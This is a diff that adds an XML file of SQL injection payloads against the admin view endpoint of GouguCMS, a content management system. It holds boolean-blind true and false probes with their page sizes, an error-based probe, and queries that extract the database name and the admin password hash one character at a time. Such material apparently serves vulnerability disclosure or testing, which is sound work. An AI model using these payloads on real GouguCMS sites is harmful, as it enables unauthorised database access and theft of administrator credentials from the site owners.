@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- GouguCMS SQL Injection Payload Examples -->
+<payloads>
+    <payload type="boolean_blind_true">
+        <url>/admin/admin/view?id=1' AND '1'='1</url>
+        <description>True condition - returns normal page (29723 bytes)</description>
+    </payload>
+    <payload type="boolean_blind_false">
+        <url>/admin/admin/view?id=1' AND '1'='2</url>
+        <description>False condition - returns empty page (28932 bytes)</description>
+    </payload>
+    <payload type="error_based">
+        <url>/admin/admin/view?id=1'</url>
+        <description>SQL syntax error - returns 500 error page</description>
+    </payload>
+    <payload type="data_extraction">
+        <url>/admin/admin/view?id=1' AND ASCII(SUBSTRING(DATABASE(),1,1))>100-- -</url>
+        <description>Extract database name via boolean blind</description>
+    </payload>
+    <payload type="admin_hash_extraction">
+        <url>/admin/admin/view?id=1' AND ASCII(SUBSTRING((SELECT pwd FROM cms_admin LIMIT 1),1,1))>50-- -</url>
+        <description>Extract admin password hash character by character</description>
+    </payload>
+</payloads>
